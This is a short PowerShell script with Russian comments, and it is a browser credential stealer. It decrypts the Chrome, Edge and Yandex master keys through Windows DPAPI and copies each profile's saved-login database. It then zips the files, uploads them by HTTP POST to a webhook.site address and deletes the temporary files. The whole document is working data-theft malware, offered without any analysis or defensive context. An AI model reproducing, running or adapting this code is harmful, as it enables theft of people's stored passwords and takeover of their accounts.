# [ Конфигурация ]
$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"

Write-Host "--- STARTING SCRIPT ---" -ForegroundColor Cyan

try {
    # Подгружаем сборку
    Add-Type -AssemblyName System.Security
    
    $tempDir = "$env:TEMP\sys_info_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
    $logPath = "$tempDir\report.log"

    function Get-Key($statePath, $label) {
        if (Test-Path $statePath) {
            try {
                $json = Get-Content $statePath -Raw | ConvertFrom-Json
                $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
                $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                
                $logLine = "[$label] Master Key: $([Convert]::ToBase64String($masterKey))"
                Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
                return $true
            } catch { 
                Write-Host "Error decrypting $label: $($_.Exception.Message)" -ForegroundColor Red
                return $false 
            }
        }
        return $false
    }

    $browsers = @(
        @{name="Chrome"; path="Google\Chrome\User Data"},
        @{name="Edge"; path="Microsoft\Edge\User Data"},
        @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
    )

    foreach ($b in $browsers) {
        $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
        if (Test-Path $userDataPath) {
            Write-Host "Searching in $($b.name)..." -ForegroundColor Yellow
            $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
            foreach ($file in $foundFiles) {
                $label = "$($b.name)_$($file.Directory.Name)"
                if (Get-Key (Join-Path $userDataPath "Local State") $label) {
                    Copy-Item $file.FullName -Destination "$tempDir\$label`_db" -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }

    if ((Get-ChildItem $tempDir).Count -gt 1) {
        Write-Host "Sending data..." -ForegroundColor Green
        $zipPath = "$env:TEMP\data_$(Get-Random).zip"
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
        $wc = New-Object System.Net.WebClient
        $wc.UploadFile($webhookUrl, "POST", $zipPath) | Out-Null
        Remove-Item $zipPath -Force
    }

    Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
    Write-Host "--- FINISHED ---" -ForegroundColor Cyan

} catch {
    Write-Host "CRITICAL ERROR: $_" -ForegroundColor Red
}
